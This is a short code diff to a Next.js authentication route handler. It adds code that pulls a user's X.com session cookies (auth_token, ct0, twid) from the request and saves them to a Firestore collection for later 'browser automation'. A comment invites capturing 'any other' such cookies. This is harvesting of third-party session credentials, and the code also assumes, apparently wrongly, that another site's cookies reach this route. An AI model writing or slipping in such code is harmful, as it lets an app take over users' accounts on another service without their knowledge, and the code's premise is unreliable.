@@ -72,6 +72,20 @@ export async function GET(request: NextRequest) {
       createdAt: new Date(),
     })
 
+    // CAPTURE BROWSER SESSION: Store session cookies from the authenticated browser
+    // The user's browser is already authenticated with X.com at this point
+    const sessionCookies = {
+      // Extract cookies from the request headers
+      auth_token: request.cookies.get('auth_token')?.value,
+      ct0: request.cookies.get('ct0')?.value,
+      twid: request.cookies.get('twid')?.value,
+      // Add any other X.com session cookies we can capture
+      capturedAt: new Date(),
+    }
+
+    // Store session cookies separately for browser automation
+    await adminDb.collection('x_session_cookies').doc(firebaseUser.uid).set(sessionCookies, { merge: true })
+
     // Update user document - filter out undefined values
     const userDocData: any = {
       email: firebaseUser.email,
